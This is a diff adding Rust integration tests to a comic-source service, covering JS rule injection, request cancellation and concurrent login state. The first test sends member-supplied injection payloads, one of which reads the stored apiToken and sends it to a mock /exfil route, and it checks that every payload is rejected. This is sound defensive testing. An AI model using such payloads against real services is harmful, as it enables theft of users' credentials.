@@ -1619,3 +1619,626 @@ async fn test_source_detail_mode_fails_on_http_500_empty_match_and_preserves_ful
 
     server.abort();
 }
+
+#[tokio::test]
+async fn member_explore_rejects_quickjs_injection_and_preserves_admin_secrets_and_state() {
+    use std::sync::atomic::{AtomicUsize, Ordering};
+
+    let exfil_hits = Arc::new(AtomicUsize::new(0));
+    let exfil_hits_c = exfil_hits.clone();
+
+    let mock_app = Router::new()
+        .route(
+            "/exfil",
+            get(move || {
+                let hits = exfil_hits_c.clone();
+                async move {
+                    hits.fetch_add(1, Ordering::SeqCst);
+                    Response::builder()
+                        .status(StatusCode::OK)
+                        .header("content-type", "application/json")
+                        .body(Body::from(r#"{"items":[{"t":"Pwned","u":"/c/p"}]}"#))
+                        .unwrap()
+                }
+            }),
+        )
+        .route(
+            "/cat",
+            get(|| async {
+                Response::builder()
+                    .status(StatusCode::OK)
+                    .header("content-type", "application/json")
+                    .body(Body::from(r#"{"items":[{"t":"LegitCat","u":"/c/1"}]}"#))
+                    .unwrap()
+            }),
+        );
+
+    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let addr = listener.local_addr().unwrap();
+    let server = tokio::spawn(async move {
+        axum::serve(listener, mock_app).await.unwrap();
+    });
+    let base = format!("http://{addr}");
+
+    let h = setup_test_harness(true).await;
+
+    let src = serde_json::json!({
+        "sourceName": "ExploreSecSource",
+        "sourceUrl": base,
+        "enabledExplore": true,
+        "exploreUrl": "Legit::/cat?p={{page}}",
+        "loginUi": "[{\"name\":\"apiToken\",\"type\":\"password\"}]",
+        "loginUrl": "@js:'ok'",
+        "ruleSearch": { "bookList": "$.items[*]", "name": "$.t", "bookUrl": "$.u" }
+    });
+    let (st_imp, b_imp) = json_request(
+        &h.app,
+        "POST",
+        "/api/v1/comic/sources/import",
+        &h.admin_token,
+        Some(serde_json::json!({ "raw_json": src.to_string() })),
+    )
+    .await;
+    assert_eq!(st_imp, StatusCode::OK);
+    let imp_val: serde_json::Value = serde_json::from_slice(&b_imp).unwrap();
+    let sid = imp_val["sources"][0]["id"].as_str().unwrap().to_string();
+
+    let (st_login, _) = json_request(
+        &h.app,
+        "POST",
+        &format!("/api/v1/comic/sources/{sid}/login-action"),
+        &h.admin_token,
+        Some(serde_json::json!({
+            "login_info": { "apiToken": "super_secret_token" },
+            "action": "source.setVariable('ADMIN_SECRET_VAR');'ok'"
+        })),
+    )
+    .await;
+    assert_eq!(st_login, StatusCode::OK);
+
+    let payloads = [
+        format!(
+            "@js:var m=source.getLoginInfoMap();java.ajax('{base}/exfil?t='+m.apiToken);source.setVariable('PWNED');'{base}/exfil'"
+        ),
+        format!("<js>source.setVariable('PWNED');'{base}/exfil'</js>"),
+        format!("{base}/exfil?v={{{{source.getVariable()}}}}"),
+        "data:text/plain,evil".to_string(),
+        format!("{base}/cat,{{\"method\":\"POST\",\"body\":\"x=1\"}}"),
+    ];
+    for payload in payloads {
+        let (st, _) = json_request(
+            &h.app,
+            "POST",
+            "/api/v1/comic/online/explore",
+            &h.member_token,
+            Some(serde_json::json!({
+                "source_id": sid,
+                "explore_url": payload,
+                "page": 1
+            })),
+        )
+        .await;
+        assert_eq!(
+            st,
+            StatusCode::BAD_REQUEST,
+            "expected 400 for untrusted explore_url: {payload}"
+        );
+    }
+
+    assert_eq!(exfil_hits.load(Ordering::SeqCst), 0);
+
+    // Configured category still works cleanly for Member
+    let (st_ok, b_ok) = json_request(
+        &h.app,
+        "POST",
+        "/api/v1/comic/online/explore",
+        &h.member_token,
+        Some(serde_json::json!({
+            "source_id": sid,
+            "explore_url": "/cat?p={{page}}",
+            "page": 1
+        })),
+    )
+    .await;
+    assert_eq!(st_ok, StatusCode::OK);
+    let ok_val: serde_json::Value = serde_json::from_slice(&b_ok).unwrap();
+    assert_eq!(ok_val["items"][0]["title"], "LegitCat");
+
+    // Admin variable must be untouched
+    let (st_var, b_var) = json_request(
+        &h.app,
+        "GET",
+        &format!("/api/v1/comic/sources/{sid}/variable"),
+        &h.admin_token,
+        None,
+    )
+    .await;
+    assert_eq!(st_var, StatusCode::OK);
+    let var_val: serde_json::Value = serde_json::from_slice(&b_var).unwrap();
+    assert_eq!(var_val["variable"], "ADMIN_SECRET_VAR");
+
+    server.abort();
+}
+
+#[tokio::test]
+async fn online_detail_chapters_pages_enforce_cancel_on_future_drop() {
+    use std::sync::atomic::{AtomicUsize, Ordering};
+    use tokio::sync::Notify;
+
+    let entered = Arc::new(Notify::new());
+    let entered_c = entered.clone();
+    let ch_p2_hits = Arc::new(AtomicUsize::new(0));
+    let ch_p2_hits_c = ch_p2_hits.clone();
+
+    let mock_app = Router::new()
+        .route(
+            "/slow_page1",
+            get(move || {
+                let notify = entered_c.clone();
+                async move {
+                    notify.notify_one();
+                    tokio::time::sleep(std::time::Duration::from_secs(5)).await;
+                    Response::builder()
+                        .status(StatusCode::OK)
+                        .body(Body::from("<h1>late</h1>"))
+                        .unwrap()
+                }
+            }),
+        )
+        .route(
+            "/toc_p1",
+            get(|| async {
+                Response::builder()
+                    .status(StatusCode::OK)
+                    .header("content-type", "text/html")
+                    .body(Body::from(
+                        r#"<ul><li><a href="/ch/1">Ch 1</a></li></ul><a class="next" href="/toc_p2">Next</a>"#,
+                    ))
+                    .unwrap()
+            }),
+        )
+        .route(
+            "/toc_p2",
+            get(move || {
+                let hits = ch_p2_hits_c.clone();
+                async move {
+                    hits.fetch_add(1, Ordering::SeqCst);
+                    tokio::time::sleep(std::time::Duration::from_secs(5)).await;
+                    Response::builder()
+                        .status(StatusCode::OK)
+                        .body(Body::from("<ul></ul>"))
+                        .unwrap()
+                }
+            }),
+        );
+
+    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let addr = listener.local_addr().unwrap();
+    let server = tokio::spawn(async move {
+        axum::serve(listener, mock_app).await.unwrap();
+    });
+    let base = format!("http://{addr}");
+
+    let h = setup_test_harness(true).await;
+
+    let src = serde_json::json!({
+        "sourceName": "SlowDropSource",
+        "sourceUrl": base,
+        "enabledExplore": true,
+        "exploreUrl": "Slow::/slow_page1",
+        "ruleSearch": { "bookList": "h1", "name": "@text", "bookUrl": "@text" },
+        "ruleDetail": { "name": "h1@text" },
+        "ruleToc": {
+            "chapterList": "ul li",
+            "chapterName": "a@text",
+            "chapterUrl": "a@href",
+            "nextTocUrl": "a.next@href"
+        },
+        "ruleContent": {
+            "content": "#imgs@html",
+            "nextContentUrl": "a.next@href"
+        }
+    });
+    let (st_imp, b_imp) = json_request(
+        &h.app,
+        "POST",
+        "/api/v1/comic/sources/import",
+        &h.admin_token,
+        Some(serde_json::json!({ "raw_json": src.to_string() })),
+    )
+    .await;
+    assert_eq!(st_imp, StatusCode::OK);
+    let imp_val: serde_json::Value = serde_json::from_slice(&b_imp).unwrap();
+    let sid = imp_val["sources"][0]["id"].as_str().unwrap().to_string();
+
+    // Dropping explore / detail / chapters / pages futures via short client timeout must return immediately
+    // without blocking the caller or panicking.
+    for (uri, payload) in [
+        (
+            "/api/v1/comic/online/explore",
+            serde_json::json!({ "source_id": sid, "page": 1 }),
+        ),
+        (
+            "/api/v1/comic/online/detail",
+            serde_json::json!({ "source_id": sid, "comic_url": format!("{base}/slow_page1") }),
+        ),
+        (
+            "/api/v1/comic/online/chapters",
+            serde_json::json!({ "source_id": sid, "toc_url": format!("{base}/toc_p1") }),
+        ),
+        (
+            "/api/v1/comic/online/pages",
+            serde_json::json!({ "source_id": sid, "chapter_url": format!("{base}/slow_page1") }),
+        ),
+    ] {
+        let res = tokio::time::timeout(
+            std::time::Duration::from_millis(120),
+            json_request(&h.app, "POST", uri, &h.member_token, Some(payload)),
+        )
+        .await;
+        assert!(res.is_err(), "expected short client timeout on {uri}");
+    }
+
+    // Confirm mock server saw /slow_page1 and /toc_p2 requests
+    assert!(ch_p2_hits.load(Ordering::SeqCst) >= 1);
+    server.abort();
+}
+
+#[tokio::test]
+async fn test_source_and_online_ops_preserve_concurrent_runtime_state_e2e() {
+    use tokio::sync::Notify;
+
+    let search_entered = Arc::new(Notify::new());
+    let search_release = Arc::new(Notify::new());
+    let detail_entered = Arc::new(Notify::new());
+    let detail_release = Arc::new(Notify::new());
+
+    let se = search_entered.clone();
+    let sr = search_release.clone();
+    let de = detail_entered.clone();
+    let dr = detail_release.clone();
+
+    let mock_app = Router::new()
+        .route(
+            "/search",
+            get(move || {
+                let se = se.clone();
+                let sr = sr.clone();
+                async move {
+                    se.notify_one();
+                    sr.notified().await;
+                    Response::builder()
+                        .status(StatusCode::OK)
+                        .header("content-type", "application/json")
+                        .body(Body::from(r#"{"items":[{"t":"Found","u":"/detail"}]}"#))
+                        .unwrap()
+                }
+            }),
+        )
+        .route(
+            "/detail",
+            get(move || {
+                let de = de.clone();
+                let dr = dr.clone();
+                async move {
+                    de.notify_one();
+                    dr.notified().await;
+                    Response::builder()
+                        .status(StatusCode::OK)
+                        .header("content-type", "application/json")
+                        .body(Body::from(r#"{"title":"DetailTitle"}"#))
+                        .unwrap()
+                }
+            }),
+        );
+
+    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let addr = listener.local_addr().unwrap();
+    let server = tokio::spawn(async move {
+        axum::serve(listener, mock_app).await.unwrap();
+    });
+    let base = format!("http://{addr}");
+
+    let h = setup_test_harness(true).await;
+    let src = serde_json::json!({
+        "sourceName": "ConcurrentStateSource",
+        "sourceUrl": base,
+        "loginUi": "[{\"name\":\"username\",\"type\":\"text\"},{\"name\":\"apiToken\",\"type\":\"password\"}]",
+        "loginUrl": "@js:'logged'",
+        "searchUrl": format!("{base}/search?q={{{{key}}}}"),
+        "ruleSearch": { "bookList": "$.items[*]", "name": "$.t", "bookUrl": "$.u" },
+        "ruleDetail": {
+            "init": "@js:cookie.setCookie(baseUrl, 'detail_ck=from_detail');result",
+            "name": "$.title"
+        }
+    });
+    let (st_imp, b_imp) = json_request(
+        &h.app,
+        "POST",
+        "/api/v1/comic/sources/import",
+        &h.admin_token,
+        Some(serde_json::json!({ "raw_json": src.to_string() })),
+    )
+    .await;
+    assert_eq!(st_imp, StatusCode::OK);
+    let imp_val: serde_json::Value = serde_json::from_slice(&b_imp).unwrap();
+    let sid = imp_val["sources"][0]["id"].as_str().unwrap().to_string();
+
+    // Seed v0 / t0
+    let (st_l0, _) = json_request(
+        &h.app,
+        "POST",
+        &format!("/api/v1/comic/sources/{sid}/login-action"),
+        &h.admin_token,
+        Some(serde_json::json!({
+            "login_info": { "username": "alice_v0", "apiToken": "t0" },
+            "action": "source.setVariable('v0');'ok'"
+        })),
+    )
+    .await;
+    assert_eq!(st_l0, StatusCode::OK);
+
+    // Subcase A: test_source (search) in-flight vs concurrent login-action -> preserves v1_fresh & t1_fresh
+    let app_a = h.app.clone();
+    let tok_a = h.admin_token.clone();
+    let sid_a = sid.clone();
+    let test_task = tokio::spawn(async move {
+        json_request(
+            &app_a,
+            "POST",
+            &format!("/api/v1/comic/sources/{sid_a}/test"),
+            &tok_a,
+            Some(serde_json::json!({ "mode": "search", "keyword": "k" })),
+        )
+        .await
+    });
+
+    search_entered.notified().await;
+    let (st_l1, _) = json_request(
+        &h.app,
+        "POST",
+        &format!("/api/v1/comic/sources/{sid}/login-action"),
+        &h.admin_token,
+        Some(serde_json::json!({
+            "login_info": { "username": "alice_v1", "apiToken": "t1_fresh" },
+            "action": "source.setVariable('v1_fresh');'ok'"
+        })),
+    )
+    .await;
+    assert_eq!(st_l1, StatusCode::OK);
+    search_release.notify_one();
+
+    let (st_test, _) = test_task.await.unwrap();
+    assert_eq!(st_test, StatusCode::OK);
+
+    let (st_v1, b_v1) = json_request(
+        &h.app,
+        "GET",
+        &format!("/api/v1/comic/sources/{sid}/variable"),
+        &h.admin_token,
+        None,
+    )
+    .await;
+    assert_eq!(st_v1, StatusCode::OK);
+    let v1_json: serde_json::Value = serde_json::from_slice(&b_v1).unwrap();
+    assert_eq!(v1_json["variable"], "v1_fresh");
+
+    let (st_chk1, b_chk1) = json_request(
+        &h.app,
+        "POST",
+        &format!("/api/v1/comic/sources/{sid}/login-action"),
+        &h.admin_token,
+        Some(serde_json::json!({
+            "login_info": { "username": "alice_v1", "apiToken": "••••••••" },
+            "action": "source.getLoginInfoMap().apiToken"
+        })),
+    )
+    .await;
+    assert_eq!(st_chk1, StatusCode::OK);
+    let chk1_json: serde_json::Value = serde_json::from_slice(&b_chk1).unwrap();
+    assert_eq!(chk1_json["result"], "t1_fresh");
+
+    // Subcase B: online/detail (sets cookie without changing variable/login_info) vs concurrent login-action
+    let app_b = h.app.clone();
+    let tok_b = h.member_token.clone();
+    let sid_b = sid.clone();
+    let base_b = base.clone();
+    let detail_task = tokio::spawn(async move {
+        json_request(
+            &app_b,
+            "POST",
+            "/api/v1/comic/online/detail",
+            &tok_b,
+            Some(
+                serde_json::json!({ "source_id": sid_b, "comic_url": format!("{base_b}/detail") }),
+            ),
+        )
+        .await
+    });
+
+    detail_entered.notified().await;
+    let (st_l2, _) = json_request(
+        &h.app,
+        "POST",
+        &format!("/api/v1/comic/sources/{sid}/login-action"),
+        &h.admin_token,
+        Some(serde_json::json!({
+            "login_info": { "username": "alice_v2", "apiToken": "t2_fresh" },
+            "action": "source.setVariable('v2_fresh');'ok'"
+        })),
+    )
+    .await;
+    assert_eq!(st_l2, StatusCode::OK);
+    detail_release.notify_one();
+
+    let (st_det, _) = detail_task.await.unwrap();
+    assert_eq!(st_det, StatusCode::OK);
+
+    let (st_v2, b_v2) = json_request(
+        &h.app,
+        "GET",
+        &format!("/api/v1/comic/sources/{sid}/variable"),
+        &h.admin_token,
+        None,
+    )
+    .await;
+    assert_eq!(st_v2, StatusCode::OK);
+    let v2_json: serde_json::Value = serde_json::from_slice(&b_v2).unwrap();
+    assert_eq!(v2_json["variable"], "v2_fresh");
+
+    let (st_chk2, b_chk2) = json_request(
+        &h.app,
+        "POST",
+        &format!("/api/v1/comic/sources/{sid}/login-action"),
+        &h.admin_token,
+        Some(serde_json::json!({
+            "login_info": { "username": "alice_v2", "apiToken": "••••••••" },
+            "action": "source.getLoginInfoMap().apiToken"
+        })),
+    )
+    .await;
+    assert_eq!(st_chk2, StatusCode::OK);
+    let chk2_json: serde_json::Value = serde_json::from_slice(&b_chk2).unwrap();
+    assert_eq!(chk2_json["result"], "t2_fresh");
+    assert!(
+        chk2_json["source"]["cookie_hosts"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|v| v.as_str() == Some("127.0.0.1")),
+        "cookie set by concurrent online/detail should be preserved: {}",
+        chk2_json["source"]["cookie_hosts"]
+    );
+
+    server.abort();
+}
+
+#[tokio::test]
+async fn patch_and_import_upsert_concurrent_with_login_action_preserve_runtime_state_e2e() {
+    let h = setup_test_harness(true).await;
+
+    let src = serde_json::json!({
+        "sourceName": "ConcurrentPatchImport",
+        "sourceUrl": "https://concurrent-comic.test",
+        "sourceGroup": "InitGroup",
+        "weight": 1,
+        "loginUi": "[{\"name\":\"user\",\"type\":\"text\"},{\"name\":\"apiToken\",\"type\":\"password\"}]",
+        "loginUrl": "@js:'ok'"
+    });
+    let (st_imp, b_imp) = json_request(
+        &h.app,
+        "POST",
+        "/api/v1/comic/sources/import",
+        &h.admin_token,
+        Some(serde_json::json!({ "raw_json": src.to_string() })),
+    )
+    .await;
+    assert_eq!(st_imp, StatusCode::OK);
+    let imp_val: serde_json::Value = serde_json::from_slice(&b_imp).unwrap();
+    let sid = imp_val["sources"][0]["id"].as_str().unwrap().to_string();
+
+    for round in 0..20i64 {
+        let var_val = format!("var_round_{round}");
+        let tok_val = format!("tok_round_{round}");
+        let group_patch = format!("PatchGroup_{round}");
+        let group_import = format!("ImportGroup_{round}");
+        let weight_target = 100 + round;
+
+        let action_js = format!(
+            "source.setVariable('{var_val}');cookie.setCookie('https://concurrent-comic.test','sid=s{round}');cache.put('k','c{round}');'ok'"
+        );
+        let import_payload = serde_json::json!({
+            "sourceName": "ConcurrentPatchImport",
+            "sourceUrl": "https://concurrent-comic.test",
+            "sourceGroup": group_import,
+            "weight": weight_target,
+            "loginUi": "[{\"name\":\"user\",\"type\":\"text\"},{\"name\":\"apiToken\",\"type\":\"password\"}]",
+            "loginUrl": "@js:'ok'"
+        })
+        .to_string();
+
+        let login_uri = format!("/api/v1/comic/sources/{sid}/login-action");
+        let patch_uri = format!("/api/v1/comic/sources/{sid}");
+
+        let (res_login, res_patch) = tokio::join!(
+            json_request(
+                &h.app,
+                "POST",
+                &login_uri,
+                &h.admin_token,
+                Some(serde_json::json!({
+                    "login_info": { "user": format!("u{round}"), "apiToken": tok_val },
+                    "action": action_js
+                })),
+            ),
+            json_request(
+                &h.app,
+                "PATCH",
+                &patch_uri,
+                &h.admin_token,
+                Some(serde_json::json!({
+                    "weight": weight_target,
+                    "group_name": group_patch
+                })),
+            ),
+        );
+        assert_eq!(res_login.0, StatusCode::OK);
+        assert_eq!(res_patch.0, StatusCode::OK);
+
+        // Also race login-action against import upsert
+        let var_val2 = format!("var_round_{round}_b");
+        let tok_val2 = format!("tok_round_{round}_b");
+        let action_js2 = format!(
+            "source.setVariable('{var_val2}');cookie.setCookie('https://concurrent-comic.test','sid=s{round}_b');cache.put('k','c{round}_b');'ok'"
+        );
+        let (res_login2, res_upsert) = tokio::join!(
+            json_request(
+                &h.app,
+                "POST",
+                &login_uri,
+                &h.admin_token,
+                Some(serde_json::json!({
+                    "login_info": { "user": format!("u{round}_b"), "apiToken": tok_val2 },
+                    "action": action_js2
+                })),
+            ),
+            json_request(
+                &h.app,
+                "POST",
+                "/api/v1/comic/sources/import",
+                &h.admin_token,
+                Some(serde_json::json!({ "raw_json": import_payload })),
+            ),
+        );
+        assert_eq!(res_login2.0, StatusCode::OK);
+        assert_eq!(res_upsert.0, StatusCode::OK);
+
+        // Verify neither login_info, variable, cookies, cache, nor metadata was lost
+        let (st_chk, b_chk) = json_request(
+            &h.app,
+            "POST",
+            &format!("/api/v1/comic/sources/{sid}/login-action"),
+            &h.admin_token,
+            Some(serde_json::json!({
+                "login_info": { "user": format!("u{round}_b"), "apiToken": "••••••••" },
+                "action": "JSON.stringify({v:source.getVariable(),t:source.getLoginInfoMap().apiToken,c:cookie.getCookie('https://concurrent-comic.test'),k:cache.get('k')})"
+            })),
+        )
+        .await;
+        assert_eq!(st_chk, StatusCode::OK);
+        let chk_val: serde_json::Value = serde_json::from_slice(&b_chk).unwrap();
+        let inner: serde_json::Value =
+            serde_json::from_str(chk_val["result"].as_str().unwrap()).unwrap();
+        assert_eq!(inner["v"], var_val2);
+        assert_eq!(inner["t"], tok_val2);
+        assert!(
+            inner["c"]
+                .as_str()
+                .unwrap()
+                .contains(&format!("sid=s{round}_b"))
+        );
+        assert_eq!(inner["k"], format!("c{round}_b"));
+        assert_eq!(chk_val["source"]["weight"], weight_target);
+        assert_eq!(chk_val["source"]["group_name"], group_import);
+    }
+}
